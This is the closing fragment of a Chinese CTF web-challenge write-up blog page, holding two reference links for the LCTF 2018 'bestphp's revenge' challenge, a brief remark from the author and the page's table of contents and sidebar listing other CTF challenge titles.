+<p>[<a target="_blank" rel="noopener" href="https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge]">https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge]</a>(<a target="_blank" rel="noopener" href="https://skysec.top/2018/11/17/2018-Xctf">https://skysec.top/2018/11/17/2018-Xctf</a> Final&amp;LCTF-Bestphp/#bestphp’s-revenge)</p>
+<p><a target="_blank" rel="noopener" href="https://eustiar.com/archives/521">https://eustiar.com/archives/521</a></p>
+<p>搞了一上午和一下午, 终于搞出来了,看了很多大牛的文章,和wp,,,学到了很多, 哈哈😄</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/fb23.html">https://hack-for.fun/fb23.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/Unicode/">Unicode</a><a class="post-meta__tags" href="/tags/tricks/">tricks</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2666.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/5b36.html"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">一篇文章深入学习SQL注入漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a target="_blank" rel="noopener" href="//877.html" title=""><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-18</div><div class="title"></div></div></a></div><div><a target="_blank" rel="noopener" href="//a31e.html" title=""><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-24</div><div class="title"></div></div></a></div><div><a target="_blank" rel="noopener" href="//8d0f.html" title="ThinkPHP5漏洞学习-文件包含漏洞"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-16</div><div class="title">ThinkPHP5漏洞学习-文件包含漏洞</div></div></a></div><div><a target="_blank" rel="noopener" href="//4215.html" title=""><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-13</div><div class="title"></div></div></a></div><div><a target="_blank" rel="noopener" href="//f9a3.html" title="BUU Web 刷题笔记4"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-10</div><div class="title">BUU Web 刷题笔记4</div></div></a></div><div><a target="_blank" rel="noopener" href="//1cf8.html" title="初探Python反序列化学习笔记"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-08</div><div class="title">初探Python反序列化学习笔记</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">m0nk3y</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">1.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">2.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">3.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">4.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-Pythonginx"><span class="toc-number">5.</span> <span class="toc-text">[SUCTF 2019]Pythonginx</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IDNA"><span class="toc-number">5.1.</span> <span class="toc-text">IDNA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unicode-%E7%BC%96%E7%A0%81"><span class="toc-number">5.2.</span> <span class="toc-text">Unicode 编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASCII-%E7%BC%96%E7%A0%81"><span class="toc-number">5.3.</span> <span class="toc-text">ASCII 编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Url%E4%B8%AD%E7%9A%84Unicode%E6%BC%8F%E6%B4%9E%E5%BC%95%E5%8F%91%E7%9A%84%E5%9F%9F%E5%90%8D%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">5.4.</span> <span class="toc-text">Url中的Unicode漏洞引发的域名安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E6%AC%BA%E9%AA%97"><span class="toc-number">5.4.1.</span> <span class="toc-text">域名欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E5%88%86%E5%89%B2"><span class="toc-number">5.4.2.</span> <span class="toc-text">域名分割</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx"><span class="toc-number">5.5.</span> <span class="toc-text">Nginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">5.6.</span> <span class="toc-text">解题过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox"><span class="toc-number">6.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2018-GetShell"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2018]GetShell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2018-annonymous"><span class="toc-number">8.</span> <span class="toc-text">[SUCTF 2018]annonymous#</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">9.</span> <span class="toc-text">[安洵杯 2019]easy_web#</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-number">10.</span> <span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">11.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">12.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-number">13.</span> <span class="toc-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">14.</span> <span class="toc-text">[GWCTF 2019]我有一个数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">15.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-number">16.</span> <span class="toc-text">[BJDCTF2020]Mark loves cat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">17.</span> <span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-number">18.</span> <span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LCTF-2018-bestphp%E2%80%99s-revenge"><span class="toc-number">19.</span> <span class="toc-text">[LCTF 2018]bestphp’s revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-%E4%B8%AD%E7%9A%84session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-number">19.1.</span> <span class="toc-text">PHP 中的session 反序列化机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E7%9A%84%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">19.1.1.</span> <span class="toc-text">session的存储机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">19.1.2.</span> <span class="toc-text">session 序列化注入漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5SSRF-%E7%9A%84%E7%B1%BBSoapClient"><span class="toc-number">19.2.</span> <span class="toc-text">可以SSRF 的类SoapClient</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">19.3.</span> <span class="toc-text">参考资料:</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2986.html" title="Recent arrangements"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Recent arrangements"/></a><div class="content"><a class="title" href="/2986.html" title="Recent arrangements">Recent arrangements</a><time datetime="2099-11-01T04:00:00.000Z" title="Created 2099-11-01 12:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/9b1d.html" title="No title"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/9b1d.html" title="No title">No title</a><time datetime="2099-10-31T16:00:00.000Z" title="Created 2099-11-01 00:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/62d1.html" title="Chrome 浏览器扩展开发初试"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chrome 浏览器扩展开发初试"/></a><div class="content"><a class="title" href="/62d1.html" title="Chrome 浏览器扩展开发初试">Chrome 浏览器扩展开发初试</a><time datetime="2020-11-07T05:04:25.000Z" title="Created 2020-11-07 13:04:25">2020-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/558a.html" title="Cobalt Strike"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike"/></a><div class="content"><a class="title" href="/558a.html" title="Cobalt Strike">Cobalt Strike</a><time datetime="2020-11-04T13:33:44.000Z" title="Created 2020-11-04 21:33:44">2020-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/abc8.html" title="2020小组招新有感"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2020小组招新有感"/></a><div class="content"><a class="title" href="/abc8.html" title="2020小组招新有感">2020小组招新有感</a><time datetime="2020-10-23T16:56:04.000Z" title="Created 2020-10-24 00:56:04">2020-10-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By m0nk3y</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
